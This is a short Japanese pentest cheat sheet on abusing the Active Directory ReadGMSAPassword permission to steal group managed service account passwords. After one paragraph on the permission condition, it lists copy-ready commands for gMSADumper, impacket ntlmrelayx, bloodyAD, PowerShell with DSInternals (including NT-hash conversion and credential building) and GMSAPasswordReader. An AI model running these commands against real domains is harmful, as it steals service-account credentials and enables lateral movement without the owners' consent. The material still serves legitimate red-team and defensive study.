# ReadGMSAPasswordの悪用

この権限はgMSAアカウントの`msDS-GroupMSAMembership`属性のDACLに記載されているパーミッションが十分なオブジェクトを制御する場合に実行される可能性がある。通常、これらのオブジェクトは、gMSA アカウントの使用を明示的に許可するように設定されたプリンシパルである。

攻撃者は、これらの条件が満たされていれば、そのアカウントのgMSA（グループ管理サービスアカウント）パスワードを読み取ることができる。

# パスワードを取得する

## Linux

#### gMSADumper

```
gMSADumper.py -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>
```

#### ntlmrelayx (impacket)

```
impacket-ntlmrelayx -t ldaps://<Target_IP> -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs
```

#### bloodyAD

```
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USERNAME> -p "<PASSWORD>" get object <TargetObject> --attr msDS-ManagedPassword
```

## Windows

#### PowerShell Active Directory Module & DSInternals module

```
$gmsa = Get-ADServiceAccount -Identity <Target_Account> -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

ConvertFrom-ADManagedPasswordBlob $mp
(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash

$cred = new-object system.management.automation.PSCredential <DOMAIN>\<Target_Account>,(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```

#### [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader.git)

```
GMSAPasswordReader.exe --AccountName <Target_Account>
```



